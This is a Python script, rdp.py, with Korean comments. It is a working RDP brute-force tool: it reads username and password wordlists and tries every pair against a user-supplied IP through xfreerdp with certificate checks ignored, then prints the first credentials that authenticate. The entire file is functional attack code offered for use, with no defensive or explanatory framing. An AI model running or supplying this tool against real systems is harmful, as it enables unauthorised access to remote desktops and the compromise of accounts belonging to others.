# rdp.py

# xfreerdp가 설치되어있어야 함.
# apt install freerdp2-x11 -y
# dnf install freerdp -y


import subprocess
import os

class RDP_BF:
    def __init__(self, server):
        self.path = os.path.dirname(os.path.abspath(__file__))
        self.server = server
        with open(self.path + "/rdp_user.db", "r", encoding = "UTF-8") as tmp_file:
            self.user_li = tmp_file.read().strip().splitlines()
        with open(self.path + "/rdp_pw.db", "r", encoding = "UTF-8") as tmp_file:
            self.pw_li = tmp_file.read().strip().splitlines()

    def check_rdp_credentials(self, username, password):
        command = [
            "xfreerdp",
            "/v:%s"%(self.server), 
            "/u:%s"%(username),  
            "/p:%s"%(password),  
            "/cert-ignore",        
            "+auth-only"           
        ]

        try:
            result = subprocess.run(command, capture_output=True, text=True)

            return result.returncode == 0
        except FileNotFoundError:
            print("xfreerdp가 설치되어 있지 않습니다. 설치 후 다시 시도하십시오.")


            return False
        except Exception as e:
            print("오류 발생: %s"%(e))
            return False

    def main(self):
        run = True
        i = 0        
        cnt = 0
        while run and i < len(self.user_li):
            j = 0            
            while run and j < len(self.pw_li):
                cnt += 1
                print("실행중 : %s/%s"%(cnt, len(self.user_li) *  len(self.pw_li)))
                res = self.check_rdp_credentials(self.user_li[i], self.pw_li[j])
                if res:
                    print("인증성공!!\n USERNAME : %s\n PASSWORD : %s"%(self.user_li[i], self.pw_li[j]))
                    run = False
                j += 1 
            i += 1
        
        if run == True:
            print("일치하는 계정정보가 존재하지 않습니다.")
        


if __name__ == "__main__":
    # 테스트 실행
    server = input("ip : \n (EX:172.16.20.1)\n" )  # 서버 주소
    
    cl = RDP_BF(server)
    cl.main()
